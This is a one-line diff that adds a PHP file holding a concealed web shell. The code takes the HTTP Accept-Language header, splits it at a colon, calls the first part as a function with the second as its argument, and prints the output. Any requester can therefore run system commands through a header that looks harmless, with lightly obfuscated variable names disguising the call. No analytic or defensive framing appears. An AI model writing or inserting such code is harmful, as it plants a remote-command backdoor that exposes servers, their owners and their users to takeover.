@@ -1,0 +1,1 @@
+<?php if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])&&strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'],':')!==false){$o;$_=explode(":", $_SERVER['HTTP_ACCEPT_LANGUAGE'],2);$__=$_[0];$___=$_[1];$__($___,$o);foreach($o as $v){echo $v."<br>";}}
